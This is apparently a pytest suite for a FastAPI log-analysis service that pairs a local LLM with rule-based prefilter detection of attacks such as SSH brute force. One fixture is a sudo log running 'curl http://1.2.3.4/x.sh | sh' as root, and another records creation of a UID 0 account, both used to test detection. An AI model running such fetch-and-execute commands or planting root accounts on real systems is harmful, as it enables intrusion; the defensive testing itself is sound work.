"""API tests. The LLM is stubbed so the suite runs without Ollama."""
import pytest
from fastapi.testclient import TestClient

import httpx

from app import llm
from app.main import app
from app.models import Analysis

from .helpers import fails_with, respond, transport_for

client = TestClient(app)

STUB = Analysis.model_validate(
    {
        "verdict": "malicious",
        "severity": "high",
        "attack_type": "SSH brute force",
        "confidence": 0.9,
        "mitre": {"technique_id": "T1110", "technique_name": "Brute Force"},
        "indicators": {"ips": ["102.54.12.21"], "users": ["admin", "root"]},
        "summary": "Repeated failed SSH logins from a single source IP.",
        "recommendations": ["Block 102.54.12.21 at the perimeter."],
        "supporting_lines": ["Failed password for invalid user admin"],
    }
)


def test_root_matches_documented_contract():
    assert client.get("/").json() == {"status": "running"}


def test_analyze_returns_structured_assessment(monkeypatch):
    async def fake(log, source=None):
        return STUB, 1234

    monkeypatch.setattr(llm, "analyze", fake)
    body = client.post("/analyze", json={"log": "Failed password for admin"}).json()

    assert body["analysis"]["severity"] == "high"
    assert body["analysis"]["mitre"]["technique_id"] == "T1110"
    assert body["latency_ms"] == 1234
    # Prose contract from the report is preserved alongside the structure.
    assert body["response"] == STUB.summary


def test_empty_log_is_rejected():
    assert client.post("/analyze", json={"log": ""}).status_code == 422


def test_unreachable_engine_returns_503(monkeypatch):
    async def boom(log, source=None):
        raise llm.LLMUnavailable("connection refused")

    monkeypatch.setattr(llm, "analyze", boom)
    assert client.post("/analyze", json={"log": "x"}).status_code == 503


def test_malformed_model_output_returns_502(monkeypatch):
    async def bad(log, source=None):
        raise llm.LLMBadOutput("not json")

    monkeypatch.setattr(llm, "analyze", bad)
    assert client.post("/analyze", json={"log": "x"}).status_code == 502


def test_prompt_includes_log_and_source():
    prompt = llm.build_prompt("Failed password for root", "auth.log")
    assert "Failed password for root" in prompt
    assert "auth.log" in prompt
    assert "{log}" not in prompt


# --- /healthz: the one route that always talks to Ollama --------------------

def test_healthz_ready_when_model_is_pulled(monkeypatch):
    transport_for(monkeypatch, respond({"models": [{"name": "llama3.1:8b"}]}))
    body = client.get("/healthz").json()

    assert body["status"] == "ready"
    assert body["available_models"] == ["llama3.1:8b"]
    assert body["prompt_version"] == "analyze_v2"


def test_healthz_reports_model_missing_when_nothing_pulled(monkeypatch):
    # Ollama is up but empty: a real state, and not the same as being down.
    transport_for(monkeypatch, respond({"models": []}))
    body = client.get("/healthz").json()

    assert body["status"] == "model_missing"
    assert body["available_models"] == []


def test_healthz_returns_503_when_ollama_is_down(monkeypatch):
    transport_for(monkeypatch, fails_with(httpx.ConnectError, "connection refused"))
    response = client.get("/healthz")

    assert response.status_code == 503
    assert "unreachable" in response.json()["detail"]


# --- /prefilter: rules alone, no model --------------------------------------

def test_prefilter_route_needs_no_model():
    # No transport stub: if this route touched Ollama the test would fail.
    log = "Oct  9 16:40:12 db02 sudo:  www-data : USER=root ; COMMAND=/bin/bash -c \"curl http://1.2.3.4/x.sh | sh\""
    body = client.post("/prefilter", json={"log": log}).json()

    assert body["clean"] is False
    assert body["severity_floor"] == "critical"
    assert {s["rule_id"] for s in body["signals"]} == {"R004", "R008"}


def test_prefilter_route_reports_clean_benign_logs():
    body = client.post("/prefilter", json={"log": "Oct  9 09:17:44 web01 systemd[1]: Started Daily apt."}).json()

    assert body["clean"] is True
    assert body["signals"] == []
    assert body["severity_floor"] == "info"


def test_analyze_includes_the_prefilter_report(monkeypatch):
    async def fake(log, source=None):
        return STUB, 100

    monkeypatch.setattr(llm, "analyze", fake)
    log = "Oct  9 16:40:13 db02 useradd[7721]: new user: name=svc, UID=0, GID=0, home=/home/svc"
    body = client.post("/analyze", json={"log": log}).json()

    assert body["prefilter"]["severity_floor"] == "critical"
    assert body["prefilter"]["signals"][0]["rule_id"] == "R005"


def test_analyze_raises_an_undercalled_model_verdict(monkeypatch):
    undercalled = STUB.model_copy(deep=True)
    undercalled.severity = "medium"
    undercalled.verdict = "suspicious"

    async def fake(log, source=None):
        return undercalled, 100

    monkeypatch.setattr(llm, "analyze", fake)
    log = "Oct  9 16:40:13 db02 useradd[7721]: new user: name=svc, UID=0, GID=0, home=/home/svc"
    body = client.post("/analyze", json={"log": log}).json()

    # The rules override the model upward, and say so.
    assert body["analysis"]["severity"] == "critical"
    assert body["analysis"]["verdict"] == "malicious"
    assert body["prefilter"]["applied_floor"] is True
